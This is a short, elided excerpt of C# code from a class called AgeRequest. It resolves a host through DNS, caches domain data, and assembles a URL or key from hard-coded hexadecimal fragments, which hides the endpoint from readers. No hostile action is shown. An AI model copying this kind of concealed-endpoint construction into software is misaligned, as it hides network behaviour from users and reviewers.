   ...
   public class AgeRequest
    {
        ...
        private static string GetDnsRealHost()
        {
            ...
            {
                Utils.GetDomainStr("Age_cache_domain_info", ts);
            }
            return host;
        }
        ...
        private static string GetUrl(string key)
        {
            ...
            strTxt.Append("785528A58C55A6F79C50DCD75E0430F88");
            strTxt.Append("E3B5946DDE858B7D20DF11F6334ACCC53");
            strTxt.Append("DCA95734949D348B1B4FDFCFD4341C2F1");
            strTxt.Append("834C55E746B3A");
